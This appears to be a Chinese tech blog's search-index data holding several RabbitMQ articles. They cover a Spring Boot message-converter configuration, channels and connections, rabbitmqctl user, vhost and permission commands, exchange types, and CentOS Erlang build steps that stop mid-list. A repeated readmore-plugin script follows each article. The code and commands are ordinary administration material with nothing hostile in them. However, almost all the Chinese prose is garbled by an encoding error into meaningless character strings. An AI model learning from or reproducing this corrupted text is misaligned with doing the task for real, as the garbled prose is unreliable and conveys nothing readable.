é›†ç¾¤æ­å»º .erlang.cookie è§£æƒ‘ RabbitMQ å®˜æ–¹é…ç½®è¯´æ˜ RabbitMQ æ›´æ”¹é»˜è®¤ç«¯å£ Supervior ç®¡ç† RabbitMQ æœåŠ¡ RabbitMQ ä½¿ç”¨åˆ†æå’Œé«˜å¯ç”¨é›†ç¾¤æ­å»º var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"RabbitMQ å¼€å‘éšç¬”",url:"/posts/869a4db4.html",text:'SpringBoot ä¸­é…ç½® RabbitMQ ä½¿ç”¨è‡ªå®šä¹‰æ¶ˆæ¯è½¬æ¢å™¨ ä¸šåŠ¡ä¹‹é—´å¤§å¤šæ•°æ•°æ®éƒ½æ˜¯ä»¥ JSON çš„æ•°æ®æ ¼å¼è¿›è¡Œä¼ è¾“çš„ï¼Œå³ç”Ÿäº§è€…æœåŠ¡å°† JSON ç±»å‹çš„æ•°æ®å‘é€åˆ°å¯¹åº”çš„é˜Ÿåˆ—ï¼Œ è€Œæ¶ˆè´¹ç«¯ä»é˜Ÿåˆ—ä¸­æ¥æ”¶åˆ°çš„æ•°æ®ç±»å‹ä¹Ÿæ˜¯ JSON ç±»å‹ï¼Œä¸ºäº†æ–¹ä¾¿å°† Java å¯¹è±¡è½¬ä¸º JSON ç±»å‹çš„æ•°æ®æ¥ä¼ è¾“ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ Spring å†…ç½®çš„ Jackson2JsonMessageConverter æ¶ˆæ¯è½¬æ¢å™¨ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import org.springframework.amqp.rabbit.config.SimpleRabbitListenerContainerFactory;import org.springframework.amqp.rabbit.connection.ConnectionFactory;import org.springframework.amqp.rabbit.core.RabbitAdmin;import org.springframework.amqp.rabbit.core.RabbitTemplate;import org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;import org.springframework.amqp.support.converter.MessageConverter;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class RabbitMqConfig { /** * RabbitMQçš„ç®¡ç†å¯¹è±¡ * * @param connectionFactory * @return */ @Bean public RabbitAdmin rabbitAdmin(ConnectionFactory connectionFactory) { RabbitAdmin rabbitAdmin = new RabbitAdmin(connectionFactory); return rabbitAdmin; } /** * RabbitMqçš„æ¶ˆæ¯è½¬æ¢å™¨ * * @return */ @Bean public MessageConverter jsonMessageConverter() { Jackson2JsonMessageConverter messageConverter = new Jackson2JsonMessageConverter(); return messageConverter; } /** * RabbitMqçš„æ¨¡ç‰ˆ * * @return */ @Bean public RabbitTemplate rabbitTemplate(ConnectionFactory connectionFactory, MessageConverter messageConverter) { RabbitTemplate template = new RabbitTemplate(connectionFactory); // è®¾ç½®å‘é€æ¶ˆæ¯æ—¶æ‰€ç”¨çš„æ¶ˆæ¯è½¬æ¢å™¨ template.setMessageConverter(messageConverter); return template; } /** * RabbitMqçš„ç›‘å¬å®¹å™¨å·¥å‚ * * @return */ @Bean public SimpleRabbitListenerContainerFactory rabbitListenerContainerFactory(ConnectionFactory connectionFactory, MessageConverter messageConverter) { SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory(); factory.setConnectionFactory(connectionFactory); // è®¾ç½®çº¿ç¨‹æ•° factory.setConcurrentConsumers(3); // æœ€å¤§çº¿ç¨‹æ•° factory.setMaxConcurrentConsumers(10); // è®¾ç½®æ¥æ”¶æ¶ˆæ¯æ—¶æ‰€ç”¨çš„æ¶ˆæ¯è½¬æ¢å™¨ factory.setMessageConverter(messageConverter); return factory; }} Java æ¶ˆæ¯é˜Ÿåˆ—ä»»åŠ¡çš„å¹³æ»‘å…³é—­åˆ†æ https://jaesonchen.iteye.com/blog/2342761 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼ å¼€å‘éšç¬”"},{title:"RabbitMQ å…¥é—¨æ•™ç¨‹ä¹‹äºŒ",url:"/posts/39a63bd3.html",text:'RabbitMQ çš„éé˜»å¡ I/ONIO é€šå¸¸ä¹Ÿç§°éé˜»å¡ I/Oï¼ŒåŒ…å«ä¸‰å¤§æ ¸å¿ƒéƒ¨åˆ†ï¼šChannelï¼ˆä¿¡é“ï¼‰ã€Bufferï¼ˆç¼“å†²åŒºï¼‰å’Œ Selectorï¼ˆé€‰æ‹©å™¨ï¼‰ã€‚NIO æ˜¯åŸºäº Channel å’Œ Buffer è¿›è¡Œæ“ä½œçš„ï¼Œæ•°æ®æ€»æ˜¯ä»ä¿¡é“è¯»å–æ•°æ®åˆ°ç¼“å†²åŒºä¸­ï¼Œæˆ–è€…ä»ç¼“å†²åŒºå†™å…¥åˆ°ä¿¡é“ä¸­ï¼Œè€Œ Selector åˆ™ç”¨äºç›‘å¬å¤šä¸ªä¿¡é“çš„æ—¶é—´ï¼ˆæ¯”å¦‚è¿æ¥æ‰“å¼€ï¼Œæ•°æ®åˆ°è¾¾ç­‰ï¼‰ã€‚å› æ­¤ï¼Œå•çº¿ç¨‹å¯ä»¥ç›‘å¬å¤šä¸ªæ•°æ®çš„ä¿¡é“ã€‚ç”±äº RabbitMQ é‡‡ç”¨ç±»ä¼¼ NIOï¼ˆNon-blocking I/Oï¼‰çš„åšæ³•ï¼Œé€‰æ‹© TCP è¿æ¥å¤ç”¨ï¼Œä¸ä»…å¯ä»¥å‡å°‘æ€§èƒ½å¼€é”€ï¼ŒåŒæ—¶ä¹Ÿä¾¿äºç®¡ç†ã€‚æ¯ä¸ªçº¿ç¨‹æŠŠæŒä¸€ä¸ªä¿¡é“ï¼Œæ‰€ä»¥ä¿¡é“å¤ç”¨äº† Connection çš„ TCP è¿æ¥ã€‚åŒæ—¶ RabbitMQ å¯ä»¥ç¡®ä¿æ¯ä¸ªçº¿ç¨‹çš„ç§å¯†æ€§ï¼Œå°±åƒæ‹¥æœ‰ç‹¬ç«‹çš„è¿æ¥ä¸€æ ·ã€‚å½“æ¯ä¸ªä¿¡é“çš„æµé‡ä¸æ˜¯å¾ˆå¤§æ—¶ï¼Œå¤ç”¨å•ä¸€çš„ Connection å¯ä»¥åœ¨äº§ç”Ÿæ€§èƒ½ç“¶é¢ˆçš„æƒ…å†µä¸‹æœ‰æ•ˆåœ°èŠ‚çœ TCP è¿æ¥èµ„æºã€‚ä½†æ˜¯ä¿¡é“æœ¬èº«çš„æµé‡å¾ˆå¤§æ—¶ï¼Œè¿™æ—¶å€™å¤šä¸ªä¿¡é“å¤ç”¨ä¸€ä¸ª Connection å°±ä¼šäº§ç”Ÿæ€§èƒ½ç“¶é¢ˆï¼Œè¿›è€Œä½¿æ•´ä½“çš„æµé‡è¢«é™åˆ¶äº†ã€‚æ­¤æ—¶å°±éœ€è¦å¼€è¾Ÿå¤šä¸ª Connectionï¼Œå°†è¿™äº›ä¿¡é“å‡æ‘Šåˆ°è¿™äº› Connection ä¸­ï¼Œè‡³äºè¿™äº›ç›¸å…³çš„è°ƒä¼˜ç­–ç•¥éœ€è¦æ ¹æ®ä¸šåŠ¡è‡ªèº«çš„å®é™…æƒ…å†µè¿›è¡Œè°ƒèŠ‚ã€‚ RabbitMQ çš„ ConnectionFactoryã€Connectionã€ChannelConnectionFactoryã€Connectionã€Channel éƒ½æ˜¯ RabbitMQ å¯¹å¤–æä¾›çš„ API ä¸­æœ€åŸºæœ¬çš„å¯¹è±¡ã€‚Connection æ˜¯ RabbitMQ çš„ Socket è¿æ¥ï¼Œå®ƒå°è£…äº† Socket åè®®ç›¸å…³éƒ¨åˆ†é€»è¾‘ã€‚ConnectionFactory æ˜¯å®¢æˆ·ç«¯ä¸ Broker çš„ TCP è¿æ¥å·¥å‚ï¼Œè´Ÿè´£æ ¹æ® URI åˆ›å»º Connectionã€‚Channel æ˜¯ä¸ RabbitMQ æ‰“äº¤é“çš„æœ€é‡è¦çš„ä¸€ä¸ªæ¥å£ï¼Œå¤§éƒ¨åˆ†çš„ä¸šåŠ¡æ“ä½œæ˜¯åœ¨ Channel è¿™ä¸ªæ¥å£ä¸­å®Œæˆçš„ï¼ŒåŒ…æ‹¬å®šä¹‰ Queueã€å®šä¹‰ Exchangeã€ç»‘å®š Queueã€ç»‘å®š Exchangeã€å‘å¸ƒæ¶ˆæ¯ç­‰ã€‚å¦‚æœæ¯ä¸€æ¬¡è®¿é—® RabbitMQ éƒ½å»ºç«‹ä¸€ä¸ª Connectionï¼Œåœ¨æ¶ˆæ¯é‡å¤§çš„æ—¶å€™å»ºç«‹ TCP Connection çš„å¼€é”€å°†æ˜¯å·¨å¤§çš„ï¼Œæ•ˆç‡ä¹Ÿè¾ƒä½ã€‚Channel æ˜¯åœ¨ Connection å†…éƒ¨å»ºç«‹çš„é€»è¾‘è¿æ¥ï¼Œå¦‚æœåº”ç”¨ç¨‹åºæ”¯æŒå¤šçº¿ç¨‹ï¼Œé€šå¸¸æ¯ä¸ª Thread åˆ›å»ºå•ç‹¬çš„ Channel è¿›è¡Œé€šè®¯ï¼ŒAMQP Method åŒ…å«äº† Channel ID å¸®åŠ©å®¢æˆ·ç«¯å’Œ Message Broker è¯†åˆ« Channelï¼Œæ‰€ä»¥ Channel ä¹‹é—´æ˜¯å®Œå…¨éš”ç¦»çš„ã€‚Channel ä½œä¸ºè½»é‡çº§çš„ Connection æå¤§å‡å°‘äº†æ“ä½œç³»ç»Ÿå»ºç«‹ TCP Connection çš„å¼€é”€ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼"},{title:"RabbitMQ å…¥é—¨æ•™ç¨‹ä¹‹ä¸€",url:"/posts/be3a6fb9.html",text:'ç›¸å…³ç«™ç‚¹ RabbitMQ å®˜ç½‘ RabbitMQ å®˜æ–¹æ–‡æ¡£ RabbitMQ å®˜æ–¹æ•™å­¦ä»£ç  RabbitMQ åŸºç¡€æ¦‚å¿µAMQPï¼ˆAdvanced Message Queuing Protocolï¼‰é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®ï¼Œæ˜¯åº”ç”¨å±‚åè®®çš„ä¸€ä¸ªå¼€æ”¾æ ‡å‡†ï¼Œä¸ºé¢å‘æ¶ˆæ¯çš„ä¸­é—´ä»¶è®¾è®¡ã€‚æ¶ˆæ¯ä¸­é—´ä»¶ä¸»è¦ç”¨äºç»„ä»¶ä¹‹é—´çš„è§£è€¦ï¼Œæ¶ˆæ¯çš„å‘é€è€…æ— éœ€çŸ¥é“æ¶ˆæ¯ä½¿ç”¨è€…çš„å­˜åœ¨ï¼Œåä¹‹äº¦ç„¶ã€‚AMQP çš„ä¸»è¦ç‰¹å¾æ˜¯é¢å‘æ¶ˆæ¯ã€é˜Ÿåˆ—ã€è·¯ç”±ï¼ˆåŒ…æ‹¬ç‚¹å¯¹ç‚¹å’Œå‘å¸ƒ / è®¢é˜…ï¼‰ã€å¯é æ€§ã€å®‰å…¨ã€‚RabbitMQ æ˜¯ä¸€ä¸ªå¼€æºçš„ AMQP æ ‡å‡†å®ç°ï¼ŒæœåŠ¡å™¨ç«¯ç”¨ Erlang è¯­è¨€ç¼–å†™ï¼Œæ”¯æŒå¤šç§å®¢æˆ·ç«¯ï¼Œå¦‚ï¼šPythonã€Rubyã€C#ã€Javaã€PHPã€GOã€JavaScript ç­‰ã€‚RabbitMQ ç”¨äºåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å­˜å‚¨è½¬å‘æ¶ˆæ¯ï¼Œåœ¨æ˜“ç”¨æ€§ã€æ‰©å±•æ€§ã€é«˜å¯ç”¨æ€§ã€çµæ´»çš„è·¯ç”±ã€é›†ç¾¤ã€äº‹åŠ¡ã€é«˜å¯ç”¨çš„é˜Ÿåˆ—ã€æ¶ˆæ¯æ’åºã€é—®é¢˜è¿½è¸ªã€å¯è§†åŒ–ç®¡ç†å·¥å…·ã€æ’ä»¶ç³»ç»Ÿç­‰æ–¹é¢è¡¨ç°ä¸ä¿—ã€‚ RabbitMQ çš„ç”¨æˆ·è§’è‰²åˆ†ç±» è¶…çº§ç®¡ç†å‘˜ (administrator)ï¼Œå¯ç™»é™†ç®¡ç†æ§åˆ¶å°ï¼Œå¯æŸ¥çœ‹æ‰€æœ‰çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯ä»¥å¯¹ç”¨æˆ·ï¼Œç­–ç•¥ (policy) è¿›è¡Œæ“ä½œ ç›‘æ§è€… (monitoring)ï¼Œå¯ç™»é™†ç®¡ç†æ§åˆ¶å°ï¼ŒåŒæ—¶å¯ä»¥æŸ¥çœ‹ rabbitmq èŠ‚ç‚¹çš„ç›¸å…³ä¿¡æ¯ (è¿›ç¨‹æ•°ï¼Œå†…å­˜ä½¿ç”¨æƒ…å†µï¼Œç£ç›˜ä½¿ç”¨æƒ…å†µç­‰) ç­–ç•¥åˆ¶å®šè€… (policymaker)ï¼Œå¯ç™»é™†ç®¡ç†æ§åˆ¶å°ï¼ŒåŒæ—¶å¯ä»¥å¯¹ policy è¿›è¡Œç®¡ç†ã€‚ä½†æ— æ³•æŸ¥çœ‹èŠ‚ç‚¹çš„ç›¸å…³ä¿¡æ¯ï¼Œä¸ administrator çš„å¯¹æ¯”ï¼Œadministrator èƒ½çœ‹åˆ°èŠ‚ç‚¹ä¿¡æ¯ æ™®é€šç®¡ç†è€… (management)ï¼Œä»…å¯ç™»é™†ç®¡ç†æ§åˆ¶å°ï¼Œæ— æ³•çœ‹åˆ°èŠ‚ç‚¹ä¿¡æ¯ï¼Œä¹Ÿæ— æ³•å¯¹ç­–ç•¥è¿›è¡Œç®¡ç† å…¶ä»–ï¼Œæ— æ³•ç™»é™†ç®¡ç†æ§åˆ¶å°ï¼Œé€šå¸¸å°±æ˜¯æ™®é€šçš„ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€… RabbitMQ ç”¨æˆ·ä¸è§’è‰²ç®¡ç†1234567891011121314151617181920212223242526# åˆ›å»ºè¶…çº§ç®¡ç†å‘˜ç”¨æˆ·# rabbitmqctl add_user user_admin your_password# èµ‹äºˆadministratorè§’è‰²ç»™è¶…çº§ç®¡ç†å‘˜ç”¨æˆ·# rabbitmqctl set_user_tags user_admin administrator# åˆ›å»ºç›‘æ§ç”¨æˆ·# rabbitmqctl add_user user_monitoring your_password# èµ‹äºˆmonitoringè§’è‰²ç»™ç›‘æ§ç”¨æˆ·# rabbitmqctl set_user_tags user_monitoring monitoring# åˆ›å»ºæŸä¸ªé¡¹ç›®çš„ä¸“ç”¨ç”¨æˆ·ï¼Œé™åˆ¶åªèƒ½è®¿é—®è‡ªå·±é¡¹ç›®çš„virtual hosts# rabbitmqctl add_user&nbsp;user_proj&nbsp;your_password# èµ‹äºˆmanagementç»™æŸä¸ªé¡¹ç›®çš„ä¸“ç”¨ç”¨æˆ·# rabbitmqctl set_user_tags user_proj management# æŸ¥çœ‹ç”¨æˆ·ä¸è§’è‰²åˆ—è¡¨# rabbitmqctl list_users# åˆ é™¤ç”¨æˆ·# rabbitmqctl delete_user user_admin# ä¿®æ”¹ç”¨æˆ·å¯†ç # rabbitmqctl change_password user_admin your_password RabbitMQ è™šæ‹Ÿä¸»æœºç®¡ç†å¯¹ RabbitMQ çš„ç”¨æˆ·è§’è‰²æƒé™è¿›è¡Œç®¡ç†æ—¶ï¼Œå¯ä»¥å°† RabbitMQ ç†è§£ä¸ºæ™®é€šçš„æ•°æ®åº“ï¼Œå…¶ä¸­ VHostPath å¯ä»¥ç±»æ¯”ä¸ºæ•°æ®åº“åï¼Œç”¨æˆ·è§’è‰²æƒé™åˆ™æ˜¯å¯¹æŒ‡å®šæ•°æ®åº“çš„é™åˆ¶è®¿é—®ã€‚ 12345678# åˆ›å»ºè™šæ‹Ÿä¸»æœº# rabbitmqctl add_vhost vhostpath# åˆ é™¤è™šæ‹Ÿä¸»æœº# rabbitmqctl delete_vhost vhostpath# åˆ—å‡ºæ‰€æœ‰è™šæ‹Ÿä¸»æœº# rabbitmqctl list_vhosts RabbitMQ ç”¨æˆ·æƒé™ç®¡ç†ç”¨æˆ·æƒé™æŒ‡çš„æ˜¯ç”¨æˆ·å¯¹å…¶æ‰€èƒ½è®¿é—®çš„ VHostPath çš„ exchangeï¼Œqueue çš„æ“ä½œæƒé™ï¼ŒåŒ…æ‹¬é…ç½®æƒé™ï¼Œè¯»å†™æƒé™ã€‚é…ç½®æƒé™ä¼šå½±å“åˆ° exchangeï¼Œqueue çš„å£°æ˜å’Œåˆ é™¤ï¼›è¯»å†™æƒé™å½±å“åˆ°ä» queue é‡Œå–æ¶ˆæ¯ï¼Œå‘ exchange å‘é€æ¶ˆæ¯ä»¥åŠ queue å’Œ exchange çš„ç»‘å®š (bind) æ“ä½œã€‚ä¾‹å¦‚ï¼š å°† queue ç»‘å®šåˆ°æŸ exchange ä¸Šï¼Œéœ€è¦å…·æœ‰ queue çš„å¯å†™æƒé™ï¼Œä»¥åŠ exchange çš„å¯è¯»æƒé™ï¼›å‘ exchange å‘é€æ¶ˆæ¯éœ€è¦å…·æœ‰ exchange çš„å¯å†™æƒé™ï¼›ä» queue é‡Œå–æ•°æ®éœ€è¦å…·æœ‰ queue çš„å¯è¯»æƒé™ã€‚è¯¦ç»†è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ä¸­ â€œHow permissions workâ€ éƒ¨åˆ†ã€‚ 1234567891011121314151617# èµ‹äºˆç”¨æˆ·æƒé™# rabbitmqctl set_permissions -p VHostPath user_admin ConfP WriteP ReadP# èµ‹äºˆç”¨æˆ·æ‰€æœ‰æƒé™# rabbitmqctl set_permissions -p VHostPath user_admin \'.*\' \'.*\' \'.*\'# æŸ¥çœ‹VHostPathä¸‹æ‰€æœ‰ç”¨æˆ·çš„æƒé™# rabbitmqctl list_permissions -p VHostPath# æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„æƒé™# rabbitmqctl list_user_permissions user_admin# æ¸…é™¤æŒ‡å®šç”¨æˆ·åœ¨æŒ‡å®šVHostPathä¸‹çš„æƒé™# rabbitmqctl clear_permissions -p VHostPath user_admin# æ¸…é™¤æŒ‡å®šç”¨æˆ·çš„æ‰€æœ‰æƒé™# rabbitmqctl clear_permissions user_admin RabbitMQ å¸¸ç”¨å‘½ä»¤1234567891011# åˆ—å‡ºæ‰€æœ‰é˜Ÿåˆ—# rabbitmqctl list_queues# åˆ—å‡ºæŒ‡å®šé˜Ÿåˆ—çš„ä¿¡æ¯# rabbitmqctl list_queues queue_name messages_ready messages_unacknowledged# åˆ—å‡ºæ‰€æœ‰äº¤æ¢æœº# rabbitmqctl list_exchanges# åˆ—å‡ºæ‰€æœ‰ç»‘å®š# rabbitmqctl list_bindings RabbitMQ Simple Queue æ¨¡å¼ï¼ˆç®€å•é˜Ÿåˆ—ï¼‰ç®€å•é˜Ÿåˆ—æ¨¡å¼ä¸‹ï¼Œæ¯æ¡æ¶ˆæ¯åªä¼šè¢«ä¸€ä¸ªæ¶ˆè´¹è€…æ‰€æ¥æ”¶ï¼Œä¸å­˜åœ¨å¤šä¸ªæ¶ˆè´¹è€…æ¥æ”¶åˆ°åŒä¸€æ¡æ¶ˆæ¯çš„æƒ…å†µï¼Œè€Œä¸”ä¸ç®¡æœ‰å¤šå°‘ä¸ªæ¶ˆè´¹è€…ï¼Œé»˜è®¤æƒ…å†µä¸‹æœåŠ¡ç«¯éƒ½ä¼šä»¥è½®è¯¢åˆ†å‘ï¼ˆround-robinï¼‰çš„æ–¹å¼ç¡®ä¿æ¯ä¸ªæ¶ˆè´¹è€…æ¥æ”¶åˆ°çš„æ¶ˆæ¯æ•°é‡æ˜¯ä¸€æ ·çš„ã€‚ RabbitMQ Work Queue æ¨¡å¼ï¼ˆå·¥ä½œé˜Ÿåˆ—ï¼‰å·¥ä½œé˜Ÿåˆ—æ¨¡å¼ä¸‹ï¼Œæ¯æ¡æ¶ˆæ¯åªä¼šè¢«ä¸€ä¸ªæ¶ˆè´¹è€…æ‰€æ¥æ”¶ï¼Œä¸å­˜åœ¨å¤šä¸ªæ¶ˆè´¹è€…æ¥æ”¶åˆ°åŒä¸€æ¡æ¶ˆæ¯çš„æƒ…å†µï¼›åŒæ—¶å·¥ä½œé˜Ÿåˆ—æ¨¡å¼å¯ä»¥ä½¿ç”¨å…¬å¹³åˆ†å‘ï¼ˆfair dispatchï¼‰çš„æ–¹å¼æ¥å‘é€æ¶ˆæ¯ï¼Œç‰¹ç‚¹æ˜¯å¤„ç†èƒ½åŠ›å¼ºçš„æ¶ˆè´¹è€…å¯ä»¥æ¥æ”¶åˆ°æ›´å¤šçš„æ¶ˆæ¯ï¼ˆèƒ½è€…å¤šåŠ³ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯ä¸ç®€å•é˜Ÿåˆ—æ¨¡å¼ç›¸æ¯”è¾ƒä¸åŒçš„åœ°æ–¹ã€‚å½“ä½¿ç”¨å…¬å¹³åˆ†å‘æ—¶ï¼Œæ¶ˆè´¹è€…å¯è°ƒç”¨ basicQosï¼ˆï¼‰æ–¹æ³•ï¼ŒåŒæ—¶éœ€è¦æ‰‹åŠ¨ç¡®è®¤æ¶ˆæ¯ï¼ˆACK æœºåˆ¶ï¼‰ã€‚ RabbitMQ Fanout æ¨¡å¼ï¼ˆå‘å¸ƒ / è®¢é˜…ï¼‰å•ä¸ªç”Ÿäº§è€…å¯ä»¥å¯¹åº”å¤šä¸ªæ¶ˆè´¹è€…ï¼Œæ¯ä¸ªæ¶ˆè´¹è€…éƒ½æœ‰è‡ªå·±çš„é˜Ÿåˆ—ï¼ŒåŒä¸€æ¡æ¶ˆæ¯å¯ä»¥è¢«å¤šä¸ªæ¶ˆè´¹è€…æ¥æ”¶ã€‚æ‰€æœ‰å‘é€åˆ° Fanout Exchange çš„æ¶ˆæ¯éƒ½ä¼šè¢«è½¬å‘åˆ°ä¸è¯¥ Exchange ç»‘å®š (Binding) çš„æ‰€æœ‰ Queue ä¸Šã€‚Fanout Exchange ä¸éœ€è¦é¢å¤–å¤„ç† RouteKeyï¼Œåªéœ€è¦ç®€å•åœ°å°†é˜Ÿåˆ—ç»‘å®šåˆ° Exchange ä¸Šï¼Œè¿™æ ·å‘é€åˆ° Exchange çš„æ¶ˆæ¯éƒ½ä¼šè¢«è½¬å‘åˆ°ä¸è¯¥äº¤æ¢æœºç»‘å®šçš„æ‰€æœ‰é˜Ÿåˆ—ä¸Šï¼Œä½œç”¨ç±»ä¼¼å­ç½‘å¹¿æ’­ï¼Œæ¯å°å­ç½‘å†…çš„ä¸»æœºéƒ½è·å¾—äº†ä¸€ä»½å¤åˆ¶çš„æ¶ˆæ¯ï¼Œå› æ­¤ Fanout Exchange è½¬å‘æ¶ˆæ¯æ˜¯æœ€å¿«çš„ã€‚ RabbitMQ Direct æ¨¡å¼ï¼ˆè·¯ç”±ï¼‰å•ä¸ªç”Ÿäº§è€…å¯ä»¥å¯¹åº”å¤šä¸ªæ¶ˆè´¹è€…ï¼Œæ¯ä¸ªæ¶ˆè´¹è€…éƒ½æœ‰è‡ªå·±çš„é˜Ÿåˆ—ï¼ŒåŒä¸€æ¡æ¶ˆæ¯å¯ä»¥è¢«å¤šä¸ªæ¶ˆè´¹è€…æ¥æ”¶ã€‚æ‰€æœ‰å‘é€åˆ° Direct Exchange çš„æ¶ˆæ¯ä¼šè¢«è½¬å‘åˆ° RouteKey ä¸­æŒ‡å®šçš„ Queue ä¸Šã€‚æ¶ˆæ¯ä¼ é€’æ—¶ï¼ŒRouteKey å¿…é¡»å®Œå…¨åŒ¹é…ï¼Œæ‰ä¼šè¢«é˜Ÿåˆ—æ¥æ”¶ï¼Œå¦åˆ™è¯¥æ¶ˆæ¯ä¼šè¢«æŠ›å¼ƒã€‚ RabbitMQ Topic æ¨¡å¼ï¼ˆé€šé…ç¬¦ï¼‰å•ä¸ªç”Ÿäº§è€…å¯ä»¥å¯¹åº”å¤šä¸ªæ¶ˆè´¹è€…ï¼Œæ¯ä¸ªæ¶ˆè´¹è€…éƒ½æœ‰è‡ªå·±çš„é˜Ÿåˆ—ï¼ŒåŒä¸€æ¡æ¶ˆæ¯å¯ä»¥è¢«å¤šä¸ªæ¶ˆè´¹è€…æ¥æ”¶ã€‚æ‰€æœ‰å‘é€åˆ° Topic Exchange çš„æ¶ˆæ¯ä¼šè¢«è½¬å‘åˆ°æŒ‡å®š Topic çš„ Queue ä¸Šï¼ŒExchange ä¼šå°† RouteKey å’ŒæŸä¸ª Topic è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ï¼Œæ­¤æ—¶é˜Ÿåˆ—éœ€è¦ç»‘å®šä¸€ä¸ª Topicã€‚RouteKey å¯ä»¥ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ï¼Œç¬¦å· # è¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªè¯ï¼Œç¬¦å· * è¡¨ç¤ºåŒ¹é…ä¸å¤šä¸å°‘ä¸€ä¸ªè¯ã€‚å› æ­¤ log.# èƒ½å¤ŸåŒ¹é…åˆ° log.info.oaï¼Œä½†æ˜¯ log.* åªä¼šåŒ¹é…åˆ° log.errorï¼Œæ‰€ä»¥ Topic Exchange çš„ä½¿ç”¨éå¸¸çµæ´»ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼"},{title:"Centos7 ç”Ÿäº§ç¯å¢ƒå®‰è£… RabbitMQ",url:"/posts/ffb541a9.html",text:'ç›¸å…³ç«™ç‚¹ Erlang å®˜æ–¹ä¸‹è½½åœ°å€ RabbitMQ å®˜æ–¹ä¸‹è½½åœ°å€ RabbitMQ å®˜æ–¹æ’ä»¶ä¸‹è½½åœ°å€ ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux æ›´æ”¹ç³»ç»Ÿçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° æœ¬ç«™æ•™ç¨‹ åˆ›å»º Rabbitmq ç”¨æˆ·å’Œç”¨æˆ·ç»„ 12345678# åˆ‡æ¢rootç”¨æˆ·$ sudo -i# åˆ›å»ºrabbitmqç”¨æˆ·ç»„# groupadd rabbitmq# åˆ›å»ºrabbitmqç”¨æˆ·ï¼ˆä¸å…è®¸è¿œç¨‹ç™»å½•ï¼‰# useradd -g rabbitmq rabbitmq -s /bin/false ç¼–è¯‘å®‰è£… Erlang 123456789101112131415161718192021222324252627282930313233343536373839# å®‰è£…ä¾èµ–# yum install -y make autoconf gcc gcc-c++ glibc-devel kernel-devel m4 ncurses-devel openssl-devel unixODBC unixODBC-devel libtool libtool-ltdl-devel unzip# åˆ›å»ºä¸‹è½½ç›®å½•# mkdir -p /home/rabbitmq/software# ä¸‹è½½# cd /home/rabbitmq/software# wget http://erlang.org/download/otp_src_22.0.tar.gz# è§£å‹# tar -xvf otp_src_22.0.tar.gz# åˆ é™¤ä¸‹è½½æ–‡ä»¶# rm -f otp_src_22.0.tar.gz# 